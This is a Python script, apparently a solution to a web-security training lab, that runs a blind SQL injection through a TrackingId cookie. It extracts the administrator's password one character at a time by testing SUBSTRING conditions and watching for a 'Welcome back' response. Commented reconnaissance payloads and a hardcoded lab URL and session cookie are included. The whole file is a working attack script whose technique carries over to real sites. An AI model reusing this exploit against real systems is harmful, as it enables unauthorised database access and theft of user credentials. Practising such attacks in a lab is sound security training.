#!/usr/bin/env python3

import urllib.parse
import requests

# Blind SQL injection with conditional responses

#chunk = "' AND '1'='1" # condition is true
#chunk = "' AND SUBSTR((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) > 'a"
#chunk = "' AND (SELECT 'a' FROM users LIMIT 1)='a" # verify table called users
#chunk = "' AND (SELECT 'a' FROM users WHERE username='administrator')='a" # Verify that the condition is true, confirming that there is a user called administrator.
#chunk = "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a" # No "Welcome back" message when condition is true. Use Burp Repeater
#chunk = "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a" # m


def main():
    password = 'Administrator password is: '
    for i in range(1,21):
        for x in range(65,91):
            #print("' AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+chr(x), end="\n")
            chunk = "' AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+chr(x)
            link = "https://0a8d002003ba7c12c01b0d11004a0033.web-security-academy.net" # main page to attack
            payload={}
            headers = {
                'Cookie': 'TrackingId=ldAByAJaksPN6QAW'+urllib.parse.quote(chunk)+'; session=holu5MbVl1yH9aCeZAqHgnlKzBvszOq4' 
                }
            url = link
            response = requests.request("GET", url, headers=headers, data=payload)
            for c in response.iter_lines():
                if c.find(b'Welcome back') > 1:
                    password = password + chr(x)
                    break
        for x in range(97,123):
            #print("' AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+chr(x), end="\n")
            chunk = "' AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+chr(x)
            link = "https://0a8d002003ba7c12c01b0d11004a0033.web-security-academy.net" # main page to attack
            payload={}
            headers = {
                'Cookie': 'TrackingId=ldAByAJaksPN6QAW'+urllib.parse.quote(chunk)+'; session=holu5MbVl1yH9aCeZAqHgnlKzBvszOq4' 
                }
            url = link
            response = requests.request("GET", url, headers=headers, data=payload)
            for c in response.iter_lines():
                if c.find(b'Welcome back') > 1:
                    password = password + chr(x)
                    break
        for x in range(10):
            #print("' AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+str(x), end="\n")
            chunk = "' AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+str(x)
            link = "https://0a8d002003ba7c12c01b0d11004a0033.web-security-academy.net" # main page to attack
            payload={}
            headers = {
                'Cookie': 'TrackingId=ldAByAJaksPN6QAW'+urllib.parse.quote(chunk)+'; session=holu5MbVl1yH9aCeZAqHgnlKzBvszOq4'
                }
            url = link
            response = requests.request("GET", url, headers=headers, data=payload)
            for c in response.iter_lines():
                if c.find(b'Welcome back') > 1:
                    password = password + str(x)
                    break
    print(password)
main()
